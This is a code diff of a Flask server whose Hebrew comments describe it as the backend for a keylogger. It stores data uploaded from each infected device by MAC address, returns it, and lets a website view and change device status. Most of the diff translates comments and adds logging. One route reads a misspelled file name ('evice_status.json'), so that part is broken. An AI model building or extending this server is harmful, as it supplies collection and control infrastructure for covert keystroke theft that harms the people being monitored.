@@ -6,33 +6,34 @@ app = Flask(__name__)
 
 
 def write_to_json(name_j, data):
-    """ Function to save data to a JSON file """
+    """ פונקציה לשמירת נתונים בקובץ JSON """
     try:
         file_path = f"{name_j}.json"
 
-        # If the file exists - load existing data, otherwise create an empty dictionary
+        # אם הקובץ קיים - טוענים את הנתונים הקיימים, אחרת יוצרים מילון ריק
         if os.path.exists(file_path):
             try:
                 with open(file_path, "r", encoding="utf-8") as file:
                     data_json = json.load(file)
             except json.JSONDecodeError:
-                data_json = {}  # If there is an issue with the file, initialize it
+                data_json = {}  # אם יש בעיה בקובץ, נאתחל אותו
         else:
             data_json = {}
 
-        # Update the data
+        # עדכון הנתונים
         data_json.update(data)
 
-        # Save back to the file
+        # שמירה חזרה לקובץ
         with open(file_path, "w", encoding="utf-8") as f:
             json.dump(data_json, f, ensure_ascii=False, indent=4)
     except Exception as e:
-        print("❌ Error writing JSON:", e)  # Print error
+        print("❌ שגיאה בכתיבת JSON:", e)  # הדפסת שגיאה
 
 
 @app.route('/api/status/update', methods=['POST'])
 def status_update():
-    """ Receives status data and saves it to a file based on the MAC address """
+    print("/api/status/update")
+    """ מקבל נתוני סטטוס מהקיי לוגר ושומר בקובץ לפי כתובת ה-MAC """
     try:
         data = request.get_json()
         if not data:
@@ -44,16 +45,17 @@ def status_update():
 
         status = {mac_address: data}
         write_to_json("device_status", status)
-        print("📥 Received data:", data)
+        print("📥 נתונים שהתקבלו:", data)
         return jsonify({"message": "Success"}), 200
     except Exception as e:
-        print("❌ Error:", e)
+        print("❌ שגיאה:", e)
         return jsonify({"error": str(e)}), 500
 
 
 @app.route('/api/data/upload', methods=['POST'])
 def data_upload():
-    """ Receives data from the client and saves it based on the MAC address """
+    """ קבלת נתונים מהקיי לוגר ושמירתם לפי כתובת ה-MAC """
+    print("/api/data/upload")
     try:
         data = request.get_json()
         if not data:
@@ -64,16 +66,17 @@ def data_upload():
             return jsonify({"error": "Missing mac_address in headers"}), 400
 
         write_to_json(mac_address, data)
-        print("📥 Received data:", data)
+        print("📥 נתונים שהתקבלו:", data)
         return jsonify({"message": "Success"}), 200
     except Exception as e:
-        print("❌ Error:", e)
+        print("❌ שגיאה:", e)
         return jsonify({"error": str(e)}), 500
 
 
 @app.route('/api/data/files', methods=['GET'])
 def get_data():
-    """ Retrieves data from the server based on the MAC address """
+    """ שליפת נתונים מהשרת עבור הקיי לוגר לפי כתובת MAC """
+    print("/api/data/files")
     mac_address = request.headers.get("mac_address")
     if not mac_address:
         return jsonify({"error": "Missing mac_address in headers"}), 400
@@ -81,7 +84,7 @@ def get_data():
     try:
         with open(f"{mac_address}.json", "r", encoding="utf-8") as file:
             data_json = json.load(file)
-            print("📤 Sent data:", data_json)
+            print("📤 נתונים שנשלחו:", data_json)
         return jsonify(data_json)
     except FileNotFoundError:
         return jsonify({"error": f"No data found for MAC: {mac_address}"}), 404
@@ -89,9 +92,25 @@ def get_data():
         return jsonify({"error": "Invalid JSON file"}), 500
 
 
+@app.route('/api/status/all', methods=['GET'])
+def get_status_all():
+    """ שליפת קובץ הסטטוסים של כל המכשירים המחוברים עבור הדף אינטרנט """
+    print("/api/status/all")
+    try:
+        with open("evice_status.json", "r", encoding="utf-8") as file:
+            data_json = json.load(file)
+            print("📤 נתונים שנשלחו:", data_json)
+        return jsonify(data_json)
+    except FileNotFoundError:
+        return jsonify({"error": f"No data found "}), 404
+    except json.JSONDecodeError:
+        return jsonify({"error": "Invalid JSON file"}), 500
+
+
 @app.route('/api/status/check', methods=['GET'])
 def check_status():
-    """ Checks the last status of the device based on the MAC address """
+    """ בדיקת (מהקיי לוגר) הסטטוס האחרון של המכשיר לפי MAC ע"י הקיי לוגר """
+    print("/api/status/check")
     mac_address = request.headers.get("mac_address")
     if not mac_address:
         return jsonify({"error": "Missing mac_address in headers"}), 400
@@ -104,29 +123,18 @@ def check_status():
             if not device_status:
                 return jsonify({"message": "No status found"}), 404
 
-            print("📤 Sent data:", device_status)
+            print("📤 נתונים שנשלחו:", device_status)
             return jsonify(device_status)
     except FileNotFoundError:
         return jsonify({"error": "Status file not found"}), 500
     except json.JSONDecodeError:
         return jsonify({"error": "Invalid JSON file"}), 500
 
-@app.route('/api/status/all', methods=['GET'])
-def get_status_all():
-    """ שליפת קובץ הסטטוסים של כל המכשירים המחוברים """
-    try:
-        with open("evice_status.json", "r", encoding="utf-8") as file:
-            data_json = json.load(file)
-            print("📤 נתונים שנשלחו:", data_json)
-        return jsonify(data_json)
-    except FileNotFoundError:
-        return jsonify({"error": f"No data found "}), 404
-    except json.JSONDecodeError:
-        return jsonify({"error": "Invalid JSON file"}), 500
-        
+
 @app.route('/api/status/change', methods=['POST'])
 def change_status():
-    """ Receives status data from the website and saves it to a file based on the MAC address """
+    """ מקבל נתוני סטטוס מהאתר ושומר בקובץ לפי כתובת ה-MAC """
+    print("api/status/change")
     try:
         data = request.get_json()
         if not data:
@@ -147,6 +155,7 @@ def change_status():
     except Exception as e:
         print("❌ Error:", e)
         return jsonify({"error": str(e)}), 500
+
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
